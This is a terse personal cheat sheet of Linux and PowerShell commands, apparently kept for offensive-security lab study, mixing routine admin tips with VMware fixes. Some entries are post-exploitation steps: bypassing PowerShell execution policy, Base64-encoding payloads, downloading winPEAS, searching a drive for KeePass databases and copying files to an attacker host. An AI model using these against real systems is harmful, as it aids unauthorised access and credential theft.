Locate file by name:
```bash
locate <filename>
```

Find commands:
```bash
man -k <regex search term>
```

Find command location:
```bash
which <command>
```

Find and replace in file:
```bash
sed -i ‘s/<search term>/<replace term>/g’ <target filename>
```

Change Password:
```bash
passwd
```

Start SSH:
```bash
sudo systemctl start ssh
sudo ss -antlp | grep sshd
```

Start HTTP:
```bash
sudo systemctl start apache2
sudo ss -antlp | grep apache
```
```bash
python3 -m http.server 80
```

See All Available Services:
```bash
systemctl list-unit-files
```

Install Shit Locally:
```bash
sudo dpkg -i ./<path to .deb file>
```

Assign New Environment Variable:
```bash
export NEW-VARIABLE-NAME=VALUE-TO-ASSIGN-IT-TO
```

Inspect Existing Environment Variables:
```bash
env
```

View Session Command History:
```bash
history
```

Rerun Command From History:
```bash
!<line number of command as displayed in history>
```
```bash
!! to execute the last command run
```

Monitor CPU Usage:
```bash
watch -n 1 ps aux --sort=%cpu | head -n 10
```

Get PID:
```bash
ps | grep <thing you want to find>
```
eg.
```bash
ps | grep firefox
```

Powershell or CMD:
```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo Powershell
```

Powershell 64 bit machine?
```powershell
[System.Environment]::Is64BitOperatingSystem
```

Powershell bypass script execution prevention:
```powershell
powershell -ep bypass
```

Powershell Convert to Base64:
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('<insert payload here>'))
```

Powershell Convert from Base64:
```powershell
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('<insert payload here>'))
```

Powershell download from URL:
```powershell
(New-Object System.Net.WebClient).DownloadFile("<URL>","C:\path\to\destination")
```

Alternative Powershell download from URL:
```powershell
iwr -uri http://my.url/winPEASx64.exe -Outfile winPEAS.exe
```

Powershell find Keepass file:
```bash
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Powershell SCP:
```powershell
scp filename.txt kali@<our IP>:/home/kali
```

RDP Connection:
```bash
xfreerdp /u:offsec /p:lab /v:192.168.123.121
```

For when the `vmmon` kernel module decides to not:
```bash
openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj "/CN=VMware/"
```
```bash
sudo /usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmmon)
```
```bash
sudo /usr/src/linux-headers-`uname -r`/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmnet)
```
```bash
sudo mokutil --import MOK.der
```
and restart.

For when clipboard between Kali and Host is fucked again for no reason:
```bash
sudo apt remove open-vm-tools
sudo apt remove open-vm-tools-desktop
sudo apt install open-vm-tools
sudo apt install open-vm-tools-desktop
```

For when we wanna close irritating dangling loopback listeners, first identify them via:
```bash
ss -ntlpu
```
This likely won't show the PID, to get that:
```bash
sudo lsof -i :<PORT_IN_QUESTION>
```
Then kill the process:
```bash
kill <PID>
```
